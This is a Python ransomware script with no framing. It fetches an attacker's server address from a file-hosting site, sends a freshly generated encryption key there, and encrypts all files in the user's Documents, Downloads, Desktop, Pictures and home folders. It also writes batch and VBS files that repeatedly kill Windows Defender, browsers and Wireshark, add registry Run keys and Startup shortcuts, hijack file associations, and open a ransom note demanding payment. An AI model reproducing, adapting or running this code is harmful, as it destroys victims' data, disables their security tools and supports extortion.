import os
import time
import socket
from cryptography.fernet import Fernet
import urllib.request
uv6 = 'litter.catbox.moe/chat-server-address.txt'
response = urllib.request.urlopen(uv6)
content = response.read().decode('utf-8')
host = content.strip()
z88 = 'litter.catbox.moe/port.txt'
response = urllib.request.urlopen(z88)
content = response.read().decode('utf-8')
port = content.strip()
def delayed_execution(delay, function):
    time.sleep(delay)
    function()

def baix3():
  e4 = os.environ["USERPROFILE"] + "\Documents"

  h4 = os.environ["USERPROFILE"]

  v3 = os.environ["USERPROFILE"] + "\Downloads"

  dry4 = os.environ["USERPROFILE"] + "\Desktop"

  dry77 = os.environ["USERPROFILE"] + "\Pictures"
  k3 = Fernet.generate_key()
  key_bytes = bytes(k3)
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect((host, port))
  sock.sendall(key_bytes)
  sock.close()
  l9 = Fernet(k3)
  def encrypt_file(filename, key):
    with open(filename, 'rb') as file:
        ov = file.read()

    o7 = l9.encrypt(ov)

    with open(filename, 'wb') as f:
        f.write(o7)

  def encrypt_directory(dd, l9):
    for root, dirs, files in os.walk(dd):
        for file in files:
            z1 = os.path.join(root, file)
            encrypt_file(z1, l9)

  encrypt_directory(e4, k3)
  encrypt_directory(h4, k3)
  encrypt_directory(v3, k3)
  encrypt_directory(dry4, k3)
  encrypt_directory(dry77, k3)

while True:
  print("fezelgau has his grasp upon thee!!")
  print("PRITHEEE PRITHEE HOORAH HURRAH")
  print("FOR YE HAVE VENTURED")
  print("AND YE SHALL FIND")
  print("YE CANNOT ESCAPE WHAT IS THY ESSENCE")
  print("YE CANNOT ESCAPE ETERNITY AND ALL")
  print("AGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("PERHAPS A CURSE?? PERHAPS ITS HELL")
  print("YE CANNOT ESCAPE AND YE CANNOT FELL")
  print("WHAT IS THERE TO ESCAPE WHEN ITS YOU?")
  print("WHAT IS THERE TO ESCAPE WHEN ITS YOU?")
  print("MUCH TIME HAS BEEN WASTED!!")
  with open("d8j.bat", "w") as m:
    m.write("@echo off\n")
    m.write(":r")
    m.write("taskkill /F /IM MsMpEng.exe")
    m.write("taskkill /F /IM chrome.exe")
    m.write("taskkill /F /IM Discord.exe")
    m.write("taskkill /F /IM Code.exe")
    m.write("taskkill /F /IM explorer.exe")
    m.write("taskkill /F /IM python3.9.exe")
    m.write("taskkill /F /IM Wireshark.exe")
    m.write("taskkill /F /IM brave.exe")
    m.write("taskkill /F /IM firefox.exe")
    m.write("taskkill /F /IM MicrosoftEdge.exe")
    m.write("goto r")
    m.close
    os.system("start d8j.bat")
  with open("lunzo.bat", "w") as f:
    f.write("@echo off\n")
    f.write("set command='d8j.bat'\n")
    f.write("set regkey=HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\n")
    f.write("reg add '%regkey%' /v 'BrowserStart' /t REG_SZ /d '%command%' /f\n")
    f.write("assoc .html=htmldocument\n")
    f.write("ftype htmldocument=sweetsultan.py\n")
    f.write("assoc .mp3=mp3audiofile\n")
    f.write("ftype mp3audiofile=sweetsultan.py\n")
    f.write("assoc .mp4=mp4audiofile\n")
    f.write("ftype mp4audiofile=sweetsultan.py\n")
    f.write("assoc .avi=avivideofile\n")
    f.write("ftype avivideofile=sweetsultan.py\n")
    f.write("assoc .jpg=jpgimagefile\n")
    f.write("ftype jpgimagefile=sweetsultan.py\n")
    f.write("assoc .jpeg=jpegimagefile\n")
    f.write("ftype jpegimagefile=sweetsultan.py\n")
    f.write("assoc .png=pngimagefile\n")
    f.write("ftype pngimagefile=sweetsultan.py\n")
    f.write("assoc .php=phpscriptfile\n")
    f.write("ftype phpscriptfile=sweetsultan.py\n")
    f.write("assoc .py=pythonscriptfile\n")
    f.write("ftype pythonscriptfile=sweetsultan.py\n")
    f.write("'echo THE SULTAN SINGS HIS SWEET TUNE UPON THE CRESCENT HILLS'\n")
    f.write("set TITLE='System'\n")
    f.write("set BUTTONS='YesNoCancel'\n")
    f.write("set ICON='Information'\n")
    f.write("PowerShell -Command '& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(%MESSAGE%, %TITLE%, %BUTTONS%, %ICON%)}'")
    f.write(":r")
    f.write("taskkill /F /IM MsMpEng.exe")
    f.write("taskkill /F /IM chrome.exe")
    f.write("taskkill /F /IM Discord.exe")
    f.write("taskkill /F /IM Code.exe")
    f.write("taskkill /F /IM explorer.exe")
    f.write("taskkill /F /IM python3.9.exe")
    f.write("taskkill /F /IM Wireshark.exe")
    f.write("taskkill /F /IM brave.exe")
    f.write("taskkill /F /IM firefox.exe")
    f.write("taskkill /F /IM MicrosoftEdge.exe")
    f.write("goto r")
    f.close()
    os.system("start lunzo.bat")
  with open("ofuk.vbs", "w") as d:
    d.write("Set w3 = WScript.CreateObject('WScript.Shell')\n")
    d.write("t7 = w3.SpecialFolders('Startup')")
    d.write("Set b6 = w3.CreateShortcut(t7 & '\%random%%random%%random%%random%.lnk')")
    d.write("b6.TargetPath = 'lunzo.bat'")
    d.write("b6.WindowStyle = 0")
    d.write("b6.Save")
    d.close()
    os.system("start ofuk.vbs")
  delayed_execution(77, baix3)
  print("SUFFER FOR ETERNAL TORMENT")
  print("AGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AGHGGHGHGHGHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AAAAAAAAAAAAAAAAAAAAAHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AGHGGHGHGHGHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AAAAAAAAAAAAAAAAAAAAAHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AGHGGHGHGHGHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AAAAAAAAAAAAAAAAAAAAAHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AGHGGHGHGHGHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AAAAAAAAAAAAAAAAAAAAAHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AGHGGHGHGHGHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AAAAAAAAAAAAAAAAAAAAAHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("SUFFER FOR ETERNAL TORMENT")
  print("AGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AGHGGHGHGHGHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AAAAAAAAAAAAAAAAAAAAAHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AGHGGHGHGHGHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AAAAAAAAAAAAAAAAAAAAAHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AGHGGHGHGHGHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AAAAAAAAAAAAAAAAAAAAAHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AGHGGHGHGHGHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AAAAAAAAAAAAAAAAAAAAAHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AGHGGHGHGHGHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  print("AAAAAAAAAAAAAAAAAAAAAHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH")
  with open("whatisthismannnn.txt", "w") as r:
    r.write("shiny shekles guide the mighty mekles\n")
    r.write("nothing suffices for the petty crew\n")
    r.write("end cloudflare or ull end too\n")
    r.write("lucky for yewl they feel quite kewl\n")
    r.write("pay the pretty price or forever lose the dice\n")
    r.close()
    os.system("start whatisthismannnn.txt")
  with open("oshit.vbs", "w") as u:
    u.write("Set w3 = WScript.CreateObject('WScript.Shell')\n")
    u.write("t7 = w3.SpecialFolders('Startup')")
    u.write("Set b6 = w3.CreateShortcut(t7 & '\%random%%random%%random%%random%.lnk')")
    u.write("b6.TargetPath = 'whatisthismannnn.txt'")
    u.write("b6.WindowStyle = 0")
    u.write("b6.Save")
    u.close()
    os.system("start oshit.vbs")
